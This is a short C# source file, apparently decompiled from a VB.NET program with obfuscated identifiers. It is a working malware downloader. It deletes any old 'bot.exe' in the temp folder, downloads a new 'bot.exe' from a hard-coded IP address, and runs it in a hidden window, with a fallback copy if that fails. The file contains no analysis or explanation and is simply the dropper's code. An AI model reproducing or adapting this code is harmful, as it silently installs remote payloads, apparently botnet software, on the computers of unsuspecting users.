using System;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

[StandardModule]
internal sealed class MHwRHyMWFEseFboCkBnrRFD
{
	private static string xPMjEdjfruJegpzuXnGatnd = Path.GetTempPath();

	[STAThread]
	public static void Main()
	{
		try
		{
			if (Conversions.ToBoolean(xPMjEdjfruJegpzuXnGatnd + Conversions.ToString(((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("\\bot.exe"))))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(xPMjEdjfruJegpzuXnGatnd + "\\bot.exe");
			}
			((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://91.206.200.132/9/bot.exe", xPMjEdjfruJegpzuXnGatnd + "/bot.exe");
			Interaction.Shell(xPMjEdjfruJegpzuXnGatnd + "\\bot.exe", (AppWinStyle)2, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			((ServerComputer)MyProject.Computer).get_Network().DownloadFile("http://91.206.200.132/9/bot.exe", xPMjEdjfruJegpzuXnGatnd + "/botsss.exe");
			Interaction.Shell(xPMjEdjfruJegpzuXnGatnd + "\\botsss.exe", (AppWinStyle)2, false, -1);
			ProjectData.ClearProjectError();
		}
	}
}
